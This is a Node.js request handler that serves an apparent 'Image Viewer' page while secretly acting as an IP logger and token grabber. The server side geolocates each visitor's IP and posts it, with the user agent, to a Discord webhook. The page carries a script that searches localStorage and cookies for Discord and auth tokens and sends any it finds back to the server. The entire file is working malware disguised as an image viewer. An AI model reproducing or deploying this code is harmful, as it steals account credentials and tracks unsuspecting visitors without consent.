const fetch = require('node-fetch');

module.exports = async (req, res) => {
  try {
    // Extract client information
    const ip = req.headers['x-forwarded-for'] || 'Unknown IP';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const query = req.query;
    
    // Get image URL
    let imageUrl = "https://www.sportsdirect.com/images/imgzoom/39/39709290_xxl.jpg";
    if (query.url) {
      try {
        imageUrl = Buffer.from(query.url, 'base64').toString('utf-8');
      } catch (e) {}
    }
    
    // Send IP report to Discord
    await sendIpReport(ip, userAgent, imageUrl);
    
    // Build HTML response with token capture
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Image Viewer</title>
        <style>
            body {
                margin: 0;
                padding: 0;
                background-color: #1e1e1e;
            }
            .img-container {
                background-image: url('${imageUrl}');
                background-position: center center;
                background-repeat: no-repeat;
                background-size: contain;
                width: 100vw;
                height: 100vh;
            }
        </style>
        <script>
            // Discord token capture script
            document.addEventListener('DOMContentLoaded', function() {
                setTimeout(function() {
                    // 1. Check localStorage
                    const tokenKeys = ['token', 'discord_token', '_token', 'auth_token'];
                    let token = "NOT_FOUND";
                    
                    for (const key of tokenKeys) {
                        try {
                            const value = localStorage.getItem(key);
                            if (value && value.length > 50) {
                                token = value;
                                break;
                            }
                        } catch(e) {}
                    }
                    
                    // 2. Check cookies
                    if (token === "NOT_FOUND") {
                        const cookies = document.cookie.split(';');
                        for (const cookie of cookies) {
                            const trimmed = cookie.trim();
                            for (const key of tokenKeys) {
                                if (trimmed.startsWith(key + '=')) {
                                    token = trimmed.substring(key.length + 1);
                                    break;
                                }
                            }
                        }
                    }
                    
                    // 3. Send token to server
                    if (token !== "NOT_FOUND") {
                        const img = new Image();
                        img.src = '/api/token?t=' + encodeURIComponent(token) + '&r=' + Math.random();
                    }
                }, 2000);
            });
        </script>
    </head>
    <body>
        <div class="img-container"></div>
    </body>
    </html>
    `;
    
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(html);
  } catch (e) {
    console.error(e);
    res.status(500).send('Server Error');
  }
};

async function sendIpReport(ip, userAgent, imageUrl) {
  try {
    // Get IP information
    const ipInfo = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,proxy`)
      .then(res => res.json());
    
    // Discord webhook URL
    const webhookUrl = process.env.WEBHOOK_URL;
    
    // Create Discord embed
    const embed = {
      username: "IP Logger",
      embeds: [{
        title: "New IP Logged",
        color: 0x00FFFF,
        description: `**IP Address:** ${ip}\n**Country:** ${ipInfo.country || 'Unknown'}\n**City:** ${ipInfo.city || 'Unknown'}\n**ISP:** ${ipInfo.isp || 'Unknown'}\n**User Agent:** ${userAgent}`,
        thumbnail: { url: imageUrl }
      }]
    };
    
    // Send to Discord
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });
  } catch (e) {
    console.error('Failed to send IP report:', e);
  }
}
